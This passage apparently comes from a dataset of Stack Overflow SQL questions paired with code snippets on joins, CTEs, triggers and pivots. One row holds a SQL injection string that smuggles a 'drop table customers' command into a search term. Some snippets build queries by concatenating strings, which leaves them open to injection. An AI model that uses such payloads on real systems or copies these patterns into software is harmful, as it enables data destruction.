    where not exists (select 1 from table1 t1 where t1.a = t.a and t1.b = t.b);
"
3364,3962,"How to check, if a value is an integer with plpgsql?","SELECT  current_setting('myvar.user') ~ '^[0-9]+$'
"
8112,29864,faster way to do this select query,"SELECT FirstName, LastName, ID FROM EMPLOYEE WHERE FirstName = 'Test%'
OR (FirstName <> 'Test%' AND LastName = 'Test%')
"
30398,67453,writing a sql that return 3 rows to one row as a list,"SELECT substring_index(group_concat(points order by id desc separator '-'), '-', 3)
FROM   memberevents AS me
WHERE  memberid = memberevents.memberid;
"
33580,6456,"Generate ""scatter plot"" result of members against sets from SQL query","SELECT user_name, [dept1name], [dept2name], [dept3name], ...
FROM
    (SELECT s.user_name, d.dept_name,
     case when sd.user_no is not null then 'X' else '' end as matches
     from staff s
     cross join department d
     left join staff_dept sd on s.user_no = sd.user_no and d.dept_no = sd.dept_no
    ) AS s
PIVOT
(
    min(matches)
    FOR dept_name IN ([dept1name], [dept2name], [dept3name], ...)
) AS pvt
order by user_name
"
12391,13959,SELECT the SUM of multiple values to which user is subscibed,"SELECT a.id, a.lastname, a.name, a.balance, b.maxdebt
FROM (SELECT customers.id AS id, UPPER(lastname) AS lastname, name, SUM(cash.value) AS balance
      FROM customers
      JOIN cash ON customers.id = cash.customerid
      WHERE deleted = 0 AND cutoffstop < 50
      GROUP BY customers.id, lastname, name) a
INNER JOIN (SELECT SUM(tariffs.value) AS maxdebt, customers.id AS id
            FROM tariffs
            INNER JOIN assignments ON tariffs.id = assignments.tariffid
            INNER JOIN customers ON assignments.customerid = customers.id
            GROUP BY id ) b ON a.id = b.id and a.balance < b.maxdebt
"
5607,55896,How to view the original script of a materialized view?,"select dbms_metadata.get_ddl('MATERIALIZED_VIEW', 'MVIEW_NAME') from dual;
"
5898,37980,Using SQL Server trigger to change format of text,"CREATE TRIGGER [dbo].[TableInsert]
ON [Table] 
AFTER INSERT
AS
BEGIN
    UPDATE 
        t
    SET 
        t.colName = dbo.InitCap(i.colName)
    FROM 
        dbo.table t
    INNER JOIN 
        inserted i
        ON
        i.primaryKeyColumn = t.primaryKeyColumn
END
"
10436,10432,How to select the top row of each group based on a specific ordering?,"SELECT t.PrimaryId, coalesce(t.ParentId,t.PrimaryId) as parent
FROM YourTable t 
JOIN (
   SELECT coalesce(ParentId, PrimaryId) as parent, Max(DateField) as dtMax
   FROM YourTable
   GROUP BY coalesce(ParentId, PrimaryId)
) t2 ON coalesce(t.ParentId,t.PrimaryId) = parent AND t.DateField = t2.dtMax
"
14500,69827,Getting all consecutive rows differing by certain value?,"declare @Diff int = 1

;with C as
(
  select A, 
         B,
         row_number() over(partition by A order by B) as rn
  from #TEMP
),
R as
(
  select C.A,
         C.B,
         1 as G,
         C.rn
  from C
  where C.rn = 1
  union all
  select C.A,
         C.B,
         G + case when C.B-R.B <= @Diff 
               then 0
               else 1
             end,
         C.rn
  from C
    inner join R
       on R.rn + 1 = C.rn and
          R.A = C.A       
)
select A,
       B,
       dense_rank() over(order by A, G) as G
from R
order by A, G
"
19349,33547,Using XQuery with order by all elements and attribute,"declare function local:sort(
  $xml as element(cal)
) as element()
{
  element cal {
    for $e in $xml/*
    order by $e/@abc
    return local:dispatch($e)
  }
};

declare function local:remove-atts(
  $xml as element()
) as element()
{
  element { node-name($xml) } {
    $xml/@* except $xml/@abc,
    $xml/node()
  }
};

declare function local:dispatch(
  $xml as element()
) as element()
{
  typeswitch ($xml)
    case element(cal) return local:sort($xml)
    case element(tree) return local:remove-atts($xml)
    case element(tree-order) return local:remove-atts($xml)
    default return local:process($xml)
};

declare function local:process(
  $xml as element()
) as element()
{
  element { node-name($xml) } {
    $xml/@*, 
    for $n in $xml/node()
    return local:dispatch($n)
  }
};

local:process($xml)
"
35488,36827,Joining tables back to themselves in MySql,"select
    u.name as user_name,
    m.name as maintainer_name,
    l.name as location_name
from user as u
    left outer join document as d on d.id = u.doc
    left outer join user as m on m.id = d.maintainer
    left outer join location as l on l.id = u.loc
"
24506,44724,SQL Insert Query For Multiple Max IDs,"INSERT INTO mytable (ID, Comment, SeqID)
SELECT ID, 'sqc', MAX(SeqID) + 1
FROM mytable
GROUP BY ID
"
14235,42592,SQL random value in UPDATE,"UPDATE people 
SET column1 = (
    SELECT if(r.rand BETWEEN 103 AND 109, 110, r.rand)
    FROM ( SELECT floor(8+rand()*113) rand ) r
)
"
31295,60841,Need to randomize names in a user table,";WITH CTE AS
(
    SELECT *, ROW_NUMBER() OVER (ORDER BY ID) AS rn
    FROM subscribers
)
UPDATE so
SET so.[Name] = fo.[Name]
FROM CTE so
INNER JOIN (SELECT *, ROW_NUMBER() OVER (ORDER BY FirstName) AS rn
            FROM randomnames) fo
ON fo.rn = so.rn
"
21510,22356,How can I quickly solve this query?,"select a.name as name,b.name as represon from table1 a 
inner join table1 b on a.code=b.rperson
"
1387,1970,SQL Replace blank value in case statement,"CASE Name
WHEN 'English' THEN
    CASE WHEN [Ks2en]=NULL OR [Ks2en]='' THEN
        'No KS2'
    ELSE
        [Ks2en]
    END
WHEN 'Mathematics' THEN
    CASE WHEN [Ks2ma]=NULL OR [Ks2ma]='' THEN
        'No KS2'
    ELSE
        [Ks2ma]
    END
ELSE
    CASE WHEN [Ks2av]=NULL OR [Ks2av]='' THEN
        'No KS2'
    ELSE
        [Ks2av]
    END
END AS KS2
"
17780,71105,Query showing records that do NOT match in between tables,"SELECT q.InstallationDate, q.QuarterlyReportType, Reports.ReportType  
    FROM #QuarterlyReportsDue q
        LEFT OUTER JOIN Reports r
            ON q.AssessmentID = r.AssessmentID
                AND q.QuarterlyReportType = r.ReportType  
                AND r.ReportType IN ('1st Quarterly', '2nd Quarterly', '3rd Quarterly', '4th Quarterly')  
    WHERE r.AssessmentID IS NULL /* matching record not found in Reports table */
    ORDER BY #QuarterlyReportsDue.AssessmentID  
"
12030,33913,How can you access a database based on a value in a different database? (TSQL),"declare @database_name sysname

select @database_name = database_name from Table1

declare @sql nvarchar(1000)

set @sql = N'select * from ' + @database_name + N'.SchemaName.TableName'

exec sp_executesql @sql
"
790,43261,Find parents where all children have the same value,"WITH the_cte (companyName, locationName, address)
AS
(
    SELECT c.name, l.name, a.name
    FROM company AS c
    INNER JOIN location AS l
        ON l.company = c.id
    LEFT JOIN address AS a
        ON a.location = l.id
)

SELECT companyName, locationName, address
FROM the_cte
INNER JOIN
(
    SELECT companyName, COUNT(DISTINCT CASE WHEN address IS NULL THEN 0 ELSE 1 END)
    FROM the_cte
    GROUP BY companyName
    HAVING COUNT(DISTINCT CASE WHEN address IS NULL THEN 0 ELSE 1 END) = 1
) t
    ON the_cte.companyName = t.companyName
"
7052,64269,Return only latest entry in Database query containg multiple linked tables,"AND inventory.lastissuedate = 
(SELECT MAX(lastissuedate) FROM MX7PROD.dbo.inventory)
"
6234,71216,SQL Server 2008 R2 complicated view,"WITH PersonsInvolved AS
(
    SELECT  AgreementID,
            MIN(CASE WHEN pai.Value = 'Client' THEN pc.Name END) as ClientName,
            MIN(CASE WHEN pai.Value = 'EndClient' THEN pc.Name END) as EndClientName,
            MIN(CASE WHEN pai.Value = 'ContactPerson' THEN pc.Name END) as ContactPersonName
    FROM dbo.PersonAgreementInvolvement pai
    LEFT JOIN dbo.Person pc
    ON pai.PersonID = pc.PersonID
    GROUP BY AgreementID
)
SELECT  ag.StartDate, ag.EndDate, ag.PriceRate, ag.TaskDescription,
        pin.ClientName, pin.EndClientName, pin.ContactPersonName
FROM dbo.Agreement ag 
INNER JOIN PersonsInvolved pin
ON ag.AgreementID = pin.AgreementID
"
22596,71025,Get information from a MySQL database for a time period given a date,"select e.empId, count(*), sum(amount)
from employee e join
     sales s
     on e.empId = s.empId
where (date_format(now(), '%m-%d') >= date_format(e.startdate, '%m-%d') and
       s.date >= str_to_date(concat_ws('-', year(now()), month(e.startdate), day(e.startdate))
      ) or
      (date_format(now(), '%m-%d') < date_format(e.startdate, '%m-%d')
       s.date >= str_to_date(concat_ws('-', year(now()) - 1, month(e.startdate), day(e.startdate))
      )
group by e.empId
"
14960,7261,NULL NOT NULL on Default constraint in sql,"use tempdb
go
CREATE TABLE example
(
    id BIT DEFAULT (0)
)

INSERT example (id) VALUES (null)

SELECT * FROM example
"
9802,72569,Teradata Correlated subquery,"SELECT t.*,
   MIN(amount) -- previous amount
   OVER (PARTITION BY Id
         ORDER BY date_valuation, dafms DESC
         ROWS BETWEEN 1 PRECEDING AND 1 PRECEDING) AS prev_amount,
   MIN(date_valuation) -- previous date
   OVER (PARTITION BY Id
         ORDER BY date_valuation, dafms DESC
         ROWS BETWEEN 1 PRECEDING AND 1 PRECEDING) AS prev_date
FROM test5 AS t
QUALIFY cesitc = '1' -- return only the current row
"
27155,74465,SQL insert query,"INSERT INTO table_1 (rec_1, rec_2, rec_3)
SELECT val_1, 'val_2', 'val_3'
FROM other_table
WHERE val_1 NOT IN (SELECT rec_1 FROM table_1)
"
9870,1829,SQL full join without any conditions,"select * from (
    select 
        row_number() over (order by id1 asc) rn,
        id1, data1
    from ta
) t1    
full join (
    select 
        row_number() over (order by id2 asc) rn,
        id2, data2
    from tb
) t2 on t1.rn = t2.rn
full join (
    select 
        row_number() over (order by id3 asc) rn,
        id3, data3
    from tc
) t3 on t1.rn = t3.rn
"
35895,21022,MySQL query to create columns based on other tables,"   SELECT 
    tr.object_id, 
    tr.term_taxonomy_id, 
    p.ID, 
    p.post_date, 
    p.post_title, 
    p.post_excerpt, 
    p.guid, 
    t.term_id, 
    CASE WHEN tt.taxonomy = 'category' THEN t.name ELSE NULL END AS category_name,
    CASE WHEN tt.taxonomy = 'post_tag' THEN t.name ELSE NULL END AS post_tag_name
    FROM 
    wp_116_term_relationships AS tr, 
    wp_116_posts AS p, 
    wp_116_terms AS t
    LEFT JOIN wp_116_term_taxonomy as tt ON tt.term_id = t.term_id
    WHERE 
    p.post_type = 'post'
    AND p.ID = tr.object_ID
    AND tr.term_taxonomy_id = tt.term_taxonomy_id
    AND p.post_date > '2013-06-01'
"
13378,47573,Get the names from individual tables using a common id table,"SELECT b.name, g.name
FROM Couples c
LEFT JOIN Boy b ON (b.id = c.Boy_id)
LEFT JOIN Girl g ON (g.id = c.Girl_id)
"
32362,198,MySQL gurus: Why 2 queries give different 'explain' index use results?,"ALTER TABLE order_line ADD INDEX(session_id, id);
ALTER TABLE donations ADD INDEX(order_line_id, npo_id, id)
"
16176,7373,Characters with accents not interpreted correctly during update on sql server,"update dbo.tbl_romanian_test 
set title = N'ă ț î'
where Id = 1
"
10626,32814,Getting all sub records in a one-to-many relationship,"<cfquery name=""local.tabQuery"" attributeCollection=""#Variables.dsn#"">
    SELECT t.id, t.name, t.sort, f.id AS fieldID, f.label
    FROM tabs t  INNER JOIN fields f ON t.id = f.tabID
    ORDER BY t.sort
</cfquery>

<cfoutput query=""local.tabQuery"" group=""sort"">
    Tab: #local.tabQuery.name#<br>

    <cfoutput>
        Field: #local.tabQuery.label#<br>
    </cfoutput>
</cfoutput>
"
33665,66425,Informix Select and output result as a matrix,"select DISTINCT 
   CUST.cust_nr, CUST.cust_name, CUST.cust_ans, 
   (select sum(M01.value_goods) from $table as M01 where M01.month_year = '1/2015' and M01.cust_nr = CUST.cust_nr),
   (select sum(M02.value_goods) from $table as M02 where M02.month_year = '2/2015' and M02.cust_nr = CUST.cust_nr),
   ...
   (select sum(M12.value_goods) from $table as M12 where M12.month_year = '12/2015' and M12.cust_nr = CUST.cust_nr)
from sales_pos as CUST order by CUST.cust_nr;
"
11486,36532,A better / more efficient way to write this query,"SELECT COUNT(1) FROM affiliations a1
WHERE EXISTS (
    SELECT 1 FROM affiliations a2
    WHERE account_email = 'address@domain.ext'
      AND a1.business_id = a2.business_id
) AND affiliated = 0
"
19352,32531,delete sql tables refering each other,"SET FOREIGN_KEY_CHECKS = 0;

DELETE FROM table1;
DELETE FROM table2;

SET FOREIGN_KEY_CHECKS = 1;
"
9771,30145,How to concatenate distinct column values from rows with duplicate IDs into one row?,";WITH CTE
AS
(
    SELECT DISTINCT
            ces.CourseEventKey,
            up.Firstname + ' ' + up.Lastname AS Name
    FROM        InstructorCourseEventSchedule ices
    INNER JOIN  CourseEventSchedule ces ON ces.CourseEventScheduleKey = ices.MemberKey
    INNER JOIN  UserProfile up ON up.UserKey = ices.UserKey
    WHERE       ces.CourseEventKey IN
                (
                    SELECT      CourseEventKey
                    FROM        @CourseEvents
                )
)          

SELECT DISTINCT i1.CourseEventKey,         
    STUFF(
           (SELECT
                '; ' + Name
                FROM CTE i2
                WHERE i1.CourseEventKey = i2.CourseEventKey
                FOR XML PATH(''))
           ,1,2, ''
        )
FROM CTE i1
ORDER BY i1.CourseEventKey
"
39161,39122,Model relationship many to many,"CREATE TABLE Input
(
    ID int NOT NULL,
    Name varchar(100),
    Comments varchar(100),
    PRIMARY KEY (ID)
);

CREATE TABLE Process
(
    ID int NOT NULL,
    Name varchar(100),
    Comments varchar(100),
    PRIMARY KEY (ID)
);

CREATE TABLE ProcessInput
(
    ID int NOT NULL,
    ProcessID int NOT NULL,
    InputID int NOT NULL,
    PRIMARY KEY (ID),
    FOREIGN KEY (ProcessID) REFERENCES Process(ID),
    FOREIGN KEY (InputID) REFERENCES Input(ID)
);
"
12720,53043,SQL Injection and multiline comments,"searchterm = ""');drop table customers;SELECT * FROM mytable WHERE ( field1 like '""
"
23714,6025,avg in query - mysql," SELECT AVG(DISTINCT salary)
   FROM worker W
   JOIN single_user U ON u.users_id_user = W.single_user_users_id_user
   JOIN university_has_single_user US ON US.single_user_users_id_user = U.users_id_user
   JOIN course C ON C.id_course = US.course_id_course
   JOIN formation_area FA ON FA.id_formation_area = C.formation_area_id_formation_area
  WHERE FA.area = ""Multimédia""
"
24906,46080,Recommended table schema for customer accounts table?,"select Customers.Name
 , Customers.id
 , ( select sum(Charges.Amount)
       from Charges
      where CustomerId = Customers.id )
 , ( select sum(Payments.Amount)
       from Payments
       where CustomerId = Customers.id )
"
34528,46891,Oracle PL SQL remove duplicate data in string,"Begin
e_name := e_name || temp;
 SELECT listagg ( names, ',' ) within GROUP (ORDER BY rn )
   INTO e_name
   FROM
  (
         SELECT level rn,
                regexp_substr ( e_name, '[^,]+', 1, level ) names,
                row_number ( ) over ( partition BY regexp_substr ( e_name, '[^,]+', 1, level ) order by level ) rnn
           FROM dual
          CONNECT BY regexp_substr ( e_name, '[^,]+', 1, level ) IS NOT NULL
  )
  WHERE rnn = 1;

Dbms_Output.Put_Line('names: ' || e_name);
"
8830,13747,How to save the header of the datagridview in database using vb.net,"Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button3.Click
    Dim fetchDGVHeaders(DataGridView1.ColumnCount) As String
    For a = 0 To DataGridView1.ColumnCount - 1
        fetchDGVHeaders(a) = DataGridView1.Columns(a).Name
        MsgBox(fetchDGVHeaders(a))
    Next
    INSERT_INTO_DB(""INSERT INTO DBHeaders(MEaw,MEow,MEow_MEow)VALUES('"" & fetchDGVHeaders(0) & ""','"" & fetchDGVHeaders(1) & ""','"" & fetchDGVHeaders(2) & ""','"" & fetchDGVHeaders(3) & ""')"")
End Sub
"
28135,72107,Use trigger to generate a primary key in oracle,"create or replace trigger ""DEMO"".""TRIGGER_A_ID""
   before insert on ""DEMO"".""A""
   referencing old as ""OLD"" new as ""NEW""
   for each row enable

   l_id varchar2(20);
begin
   select to_char(sysdate, ‘yyyymmddhh24mmss’) || to_char(seq_a_id.nextval, 'FM00000')
     into l_id
     from dual;

     :new.id:= l_new_id;
end;
"
17467,11668,Difficulty in sql select query,"SELECT o.office_id, 
       o.office_location, 
       m.manager_id, 
       count(*) staff_count
  from staff s
 inner join manager m
    on m.manager_id = s.manager_id
 inner join office o
    on o.office_id = m.office_id
 group by o.office_id, 
          o.office_location,
          m.manager_id;
"
10927,71686,Best way to prevent Update,"UPDATE Users 
 SET timefield = @timefield
WHERE UserId = @UserId AND [Day]=@day AND timefield IS NULL
"
23539,11578,Recommended SQL database design for tags or tagging,"Table: Item
Columns: ItemID, Title, Content

Table: Tag
Columns: TagID, Title

Table: ItemTag
Columns: ItemID, TagID
"
26516,16133,How to pass arrays from model to view?,"public class Video
{
    public int VideoID { get; set; }
    public string Name { get; set; }
    public ICollection<Tag> Tags { get; set; }
}

public class Tag
{
  public int TagId { get; set; }
  public int VideoId { get; set; }
  public string TagText { get; set; }
}
"
116,67146,MySQL selecting duplicate name for 2 or more ids,"select t.*
from t join
     (select name, count(distinct id) as cnt
      from t
      group by name
     ) tt
     on t.name = tt.name
where cnt >= 2;
"
29242,59641,MYSQL to display only the earliest of duplicates,"select *
from nodes n 
join nodes nlater
  on n.name = nlater.name 
  and n.reportedat < nlater.reportedat
"
11331,41225,Sql Server upper lower and index logic,"SELECT
    UPPER(LEFT(FirstName, 1)) + LOWER(RIGHT(FirstName, LEN(FirstName) - 1)) AS FirstName,
    UPPER(LEFT(LastName, 1)) + LOWER(RIGHT(LastName, LEN(LastName) - 1)) AS LastName
FROM MyTable
"
32826,58259,SQL join logic to take the availabe matched values and common values for unmatched ones,"SELECT e.employeeid, e.name, e.dept, e.rank, e.salary,
       COALESCE(i.increment, o.increment, oo.increment) increment
  FROM employee e JOIN increment oo
    ON oo.dept = 'Other'
   AND oo.rank = 'Other' LEFT JOIN increment i
    ON e.dept = i.dept
   AND e.rank = i.rank
   AND i.rank <> 'Other' LEFT JOIN increment o
    ON e.dept = o.dept
   AND o.rank = 'Other'
"
16827,20923,Oracle SQL : How to filter a NUMBER column,"SELECT * FROM TABLE WHERE CAST(NumberColumn AS VARCHAR(length)) = '%'
"
20916,58122,DESCRIBE via database link?,"select column_name, data_type from all_tab_columns where table_name = 'TABLE_NAME';
"
5650,74215,How to adjust SQL LIKE function?,"Select * from WORKER where Name Like '%' + @name + '%'
"
35571,40759,"MySQL List Set theory, relational database","select *
from business
where not exists(
  SELECT 1 FROM 
  ( 
      -- nested query that retrieves values of list 1
      SELECT val FROM list1
  ) x
  JOIN
  (
    -- nested query that retrieves values of list 2
      SELECT val FROM list2
  ) y
  ON x.val = y.val
);
"
15115,26863,how do I create a file upload in grails which works with oracle?,"static constraints = {
    rawFile(maxSize: 20 * 1024 * 1024) // 20 MBs
    // ...
}
"
12908,54256,mysql OR/AND - how does order of operations work,"$ php -r '$d = 0; while($d < pow(2,4)){$bin = sprintf(""%04b"",$d); echo $bin."" => "".@mysql_result(mysql_query(""SELECT "".$bin[0]."" AND "".$bin[1]."" OR "".$bin[2]."" AND "".$bin[3]),0,0).PHP_EOL;$d++;}'
0000 => 0
0001 => 0
0010 => 0
0011 => 1
0100 => 0
0101 => 0
0110 => 0
0111 => 1
1000 => 0
1001 => 0
1010 => 0
1011 => 1
1100 => 1
1101 => 1
1110 => 1
1111 => 1
"
24544,31801,Drop User from SQL Server Database?,"IF  EXISTS (SELECT * FROM sys.database_principals WHERE name = N'username')
DROP USER [username]
"
8863,35204,MySQL top 2 records per group,"select u.*
from (select user_id, created_datetime, 
             $num := if(@user_id = user_id, @num + 1,
                        if(@user_id := id, 1, 1)
                       ) as row_number
      from logs cross join
           (select @user_id := 0, @num := 0) params
      order by user_id 
     ) u
where row_number <= 2 ;
"
16300,72589,Forming SQL query,"SELECT name,
       votes,
       review
FROM   T_MENU
WHERE  restaurant_name 
     IN ( <four restaurant names comma separated> ) 
"
35366,14713,Also show row with NULL value,"SELECT * 
FROM project_category as a 
LEFT OUTER JOIN  project_estimate_detail  as b 
   ON a.id = b.project_cat_id 
where (b.project_cat_id IS NULL) OR (b.project_cat_id not in ('21','22','2'))
"
28543,34234,How to get total count result for following table?,"SELECT  col1, COUNT(*) totalCount
FROM    tableName
GROUP   BY col1
"
5680,8369,String formatting in T-SQL,"select Right( '0000' + cast( 1 as varchar),4)
"
5544,43469,Cascade INSERT using SEQUENCE - ORACLE,"DECLARE
   CURSOR cOld IS
      SELECT *
      FROM my_list;

   new_id  NUMBER;
BEGIN
   FOR rOld IN cOld LOOP
      new_id := sup_seq.NEXTVAL;  -- Get the ID to use for the new row

      INSERT INTO my_list
             (sup_id,sup_name,sup_code)
      VALUES (new_id,rOld.sup_name,rOld.sup_code);

      INSERT INTO my_list_details
            (buy_id,sup_id,sup_detail,max_amount,min_amount)
      SELECT buy_seq.NEXTVAL,new_id,sup_detail,max_amount,min_amount
      FROM   my_list_details
      WHERE  sup_id = rOld.sup_id;
   END LOOP;
END;
"
32761,21465,Can someone explain to me how this statement is an exclude?,"SELECT *
    FROM [table].[dbo].[one] AS t1
    LEFT JOIN [table].[dbo].[one] AS t2
         ON (t1.ColumnX = t2.ColumnX AND t2.columnY = 1)
    WHERE t2.tableID IS NULL
"
687,28114,How to load a column with multiple values into separate lines into a table,"SELECT T1.ItemNum, T2.mySplits as Substitute
FROM
 (
  SELECT *,
  CAST('<X>'+replace(T.Substitutes,'/','</X><X>')+'</X>' as XML) as my_Xml 
  FROM Table1 T
 ) T1
 CROSS APPLY
 ( 
 SELECT my_Data.D.value('.','varchar(50)') as mySplits
 FROM T1.my_Xml.nodes('X') as my_Data(D)
 ) T2
"
14414,44560,create missing rows in left joined tables,"INSERT INTO a4 (id4)
SELECT a1.id1
FROM  `a1` 
LEFT JOIN  `a4` ON a1.id1 = a4.id4
WHERE a4.id4 IS NULL
"
4648,49100,how to add a subtotal rows in oracle?,"select 
  decode(grouping(a),1,decode(grouping(subtot_id), 1, 'total', 'subtotal'),a) as a,
    sum(b) as b, sum(c) as c
from (
    select trunc((rownum-1)/3) as subtot_id, a, b, c
    from your_table
    order by a
  )
group by rollup(subtot_id, a)
"
28714,50954,Insert trigger with an IF statement,"CREATE TRIGGER username
ON temp                   
AFTER INSERT                    
AS                    

DECLARE @var1 int ,@var2 char (100)  

Select   @var1 = al_id
        ,@var2 = ac_mail
From    inserted

IF @var2 = '1@mail.com'
BEGIN
    INSERT INTO user (v_id,v_m)                    
    VALUES (@var1,@var2)      
END
"
39185,8735,T-SQL - need to run update if only one record returned by query,"with toupdate as (
     select tr.*,
            count(*) over () as cnt
     from TestRecords tr
     where tr.UnitSerial = @UnitSerial AND tr.PassFailStatus = 1
    )
update toupdate
    set Invalid = 1
    where cnt = 1
"
39958,32635,Select both matching and non-matching results in SQL query / subquery,"SELECT clothes.Item, SUM(
        CASE WHEN clothes.
                colors IN (
                    SELECT clothes.
                        colors
                    FROM clothes
                    WHERE item = 
                        'shorts' DESC 
                        LIMIT 5000
                    ) THEN 1 ELSE 0 END) 
    Matches, COUNT(clothes.
        id) AS matches, CAST(SUM
        (CASE WHEN clothes.
                    colors IN (
                        SELECT clothes
                            .colors
                        FROM clothes
                        WHERE item = 
                            'shorts' 
                            DESC LIMIT 
                            5000
                        ) THEN 1 ELSE 0 
                END) AS VARCHAR) + 
    '/' + CAST(COUNT(clothes.
            id) AS VARCHAR) AS 
    Ratio
FROM clothes clothes.item != 
    'shorts'
"
1074,39280,Optimizing query still takes a bit long time,"SELECT DISTINCT A.MBLNR
FROM MKPF A LEFT JOIN
     MSEG B
     ON B.SMBLN = A.MBLNR AND AND B.XBLNR_MKPF = '0150525913'
WHERE A.XBLNR = '0150525913' and A.MANDT='368' and B.SMBLN is null;
"
5098,5718,How to write a SELECT statement when I don't know in advance what columns I want?,"CREATE VIEW object_names AS
SELECT object_id, name FROM cat
UNION ALL
SELECT object_id, model AS name FROM shoe
UNION ALL
SELECT object_id, title AS name FROM book
GO
"
12063,58358,How can I get the percentage of total rows with mysql for a group?,"select num, string, 100 * num / total as percent
from (
    select count(*) as num, string
    from useragent_ip
    left join useragents on useragent_id = useragents.id
    group by useragent_id) x
cross join (
    select count(*) as total
    from useragent_ip
    left join useragents on useragent_id = useragents.id) y
order by num desc, string;
"
33325,35250,For loop postgres over multiple tables,"select ta.type, case when ta.str_agg = tb.str_agg then 'success' else 'failed' end
from
(select type, array_to_string(array_agg(category order by timestamp desc), ',') as str_agg
from (select * from table_a as t where t.id in (select id from table_a WHERE type = t.type order by timestamp desc  LIMIT 5)) as t1
group by type) as ta
LEFT JOIN
(select type, array_to_string(array_agg(category order by timestamp desc), ',') as str_agg
from (select * from table_b as t where t.id in (select id from table_b WHERE type = t.type order by timestamp desc  LIMIT 5)) as t1
group by type) as tb
ON (ta.type = tb.type)
"
13361,14966,SQL count occurrences of a value,"$count = $wpdb->get_results('SELECT COUNT(*) as count FROM wp_db1 WHERE value=""apple""');
"
10893,62971,Reverse MS-Access Format Function,"FORMAT(ABS(Field-1), ""Yes/No"")
"
30497,57484,SQL How to SELECT specific fields from tables using a table of table names,"CREATE PROCEDURE dbo.usp_SpatialData_GetByID
(
    @ID INT
)   
AS
BEGIN
    DECLARE @SQL NVARCHAR(MAX),
            @Selects NVARCHAR(MAX) = 'SELECT Name, Geometry, ''<<TableName>>'' AS Source FROM <<TableName>>'

    SELECT  @SQL = COALESCE(@SQL + ' UNION ALL ', '') + REPLACE(@Selects, '<<TableName>>', TableName)
    FROM    dtSpatialDataTables
    WHERE   ID = @ID

    EXEC(@SQL)
END
GO
"
27908,34824,SQL - If both only,"SELECT *
FROM Pizzas p
WHERE EXISTS
  (SELECT PizzaID FROM PizzaToppings WHERE ToppingID = 22 AND PizzaID = p.PizzaID)
  AND EXISTS
  (SELECT PizzaID FROM PizzaToppings WHERE ToppingID = 31 AND PizzaID = p.PizzaID)
"
2874,72294,mysql - Using Group By,"SELECT p.name AS Product,
       SUM(bc.quantity) AS Quantity
FROM bill_content bc JOIN
     products p
     ON bc.id = p.id
GROUP BY p.name
ORDER BY SUM(bc.quantity) DESC
LIMIT 10;
"
4070,56718,Combine sp result in select as column,"CREATE FUNCTION dbo.SomeUDF
(   
    -- Add the parameters for the function here
    @param varchar(1000)
)
RETURNS TABLE 
AS
RETURN 
(

    SELECT @param as Value
)
GO

SELECT 
    a.Value,
    'B' as Value2 
FROM dbo.SomeUDF('ABC') a
"
19849,67577,sql: including data from multiple columns,"select 
   practice, stuff1 as stuff, count(*)
from table
group by practice, stuff1
union
select 
   practice, stuff2 as stuff, count(*)
from table
group by practice, stuff2
union
select 
   practice, stuff3 as stuff, count(*)
from table
group by practice, stuff3
"
26121,53750,Emulating uniq -c in sql,"  SELECT t.column,
         COUNT(*)
    FROM YOUR_TABLE t
GROUP BY t.column
ORDER BY t.column
"
32071,29815,Sybase: what device names does a database use?,"1> sp_helpdb tempdb2
2> go
... other stuff here...
device_fragments               size          usage                created                   free     kbytes
------------------------------ ------------- -------------------- ------------------------- ----------------
tempdb2data                        2048.0 MB data only            Dec 17 2008 11:42AM                2086568
tempdb2log                         2048.0 MB log only             Dec 17 2008 11:42AM       not applicable
tempdb2log                         2048.0 MB log only             Dec 17 2008 11:42AM       not applicable
tempdb2data                        2048.0 MB data only            Dec 17 2008 11:43AM                2088960
tempdb2log                         4096.0 MB log only             Dec 17 2008 11:44AM       not applicable

--------------------------------------------------------------
log only free kbytes = 8355836
"
6423,63688,Starting MySQL Error on Snow Leopard,"[mysqld]
#
# * Basic Settings
#

user        = mysql
pid-file    = /var/run/mysqld/mysqld.pid
socket      = /var/run/mysqld/mysqld.sock
port        = 3306
basedir     = /usr
datadir     = /var/lib/mysql
tmpdir      = /tmp
skip-external-locking

#
# Instead of skip-networking the default is now to listen only on
# localhost which is more compatible and is not less secure.
bind-address        = 127.0.0.1
"
166,41976,Join query equivalent to Not IN clause (SQL Server 2008),"SELECT *
FROM Company C
LEFT JOIN CrossRef R ON R.SenderID = C.CompanyID
LEFT JOIN [User] U ON U.company_id = C.id
WHERE R.SenderID IS NULL
  AND U.company_id IS NULL
"
22168,18268,PIVOT a horizontal table with Totals,"select Mnth, Inv, Crd
from yourtable
cross apply
(
    values
        ('Jan', InvJan, CrdJan),
        ('Feb', InvFeb, CrdFeb),
        ('Mar', InvMar, CrdMar),
        ('Apr', InvApr, CrdApr),
        ('May', InvMay, CrdMay)
        -- insert more columns here
) c (Mnth, Inv, Crd);
"
34805,26713,ANSI SQL Trigger on INSERT & UPDATE,"CREATE TRIGGER widget_name_trigger
    ON
        widgets
    FOR
        INSERT, UPDATE
    AS
        UPDATE
            widgets
        SET
            widget_name = 'UNKNOWN'
        WHERE
            widget_type_id = 17
            AND
            widget_is_fizz = 1
            AND
            widget_id=inserted.widget_id
"
20889,8738,"Writing a complex SQL query, with table relations","SELECT Users.user_id, user_name, user_registration_date, COUNT(level_id) AS score
FROM Users INNER JOIN Levels_Completed ON Users.user_id = Levels_Completed.user_id
GROUP BY Users.user_id, user_name, user_registration_date
"
1470,75159,"Return only one row from Oracle SQL, using outer join and case statement","select t.""Date"", t.""Site"", t.""Result"",
        sum(case when a.Type = 'act1' then a.Count else 0 end ) AS act1,
        sum(case when a.Type = 'act2' then a.Count else 0 end ) AS act2
from   sample left outer join activity
        on (activity.sample_id = t.sample_id)
where  sample.date is between then and now
"
35776,26730,Find Top level Parent and With Recursive CTE,"WITH RCTE AS
  (
    SELECT @childID as parentId, NULL as childid, 1 AS Lvl

    UNION ALL

    SELECT rh.*, Lvl+1 AS Lvl FROM dbo.RelationHierarchy rh
    INNER JOIN RCTE rc ON rh.CHildId = rc.ParentId
    )
   SELECT TOP 1 id, Name
   FROM RCTE r
   inner JOIN dbo.Person p ON p.id = r.ParentId
   ORDER BY lvl DESC;
"
23673,12002,Oracle Get sum of distinct group without subquery,"with t as (select  'Group1' as maingroup,'Name 1' as subgroup, 'random' as random, 500 as subgroupbudget from dual
           union all
           select 'Group1','Name 1','random2',500 from dual
           union all
           select 'Group1','Name 2','random3', 500 from dual
           union all
           select 'Group2','Name 3','random4', 500 from dual
           union all
           select 'Group2','Name 4','random5',500 from dual
           union all
           select 'Group2','Name 5', 'random6',500 from dual),
    t1 as (select maingroup,
                  subgroup,
                  random,
